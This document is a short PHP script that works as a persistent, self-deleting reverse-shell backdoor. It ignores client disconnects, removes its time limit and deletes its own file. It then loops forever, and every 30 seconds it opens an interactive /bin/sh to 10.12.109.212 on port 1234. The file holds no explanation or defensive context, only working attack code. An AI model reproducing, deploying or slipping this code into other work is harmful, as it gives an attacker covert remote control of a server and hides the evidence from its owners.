<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);

while (1){
	system("php -r '\$sock=fsockopen(\"10.12.109.212\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
	sleep(30);
}
?>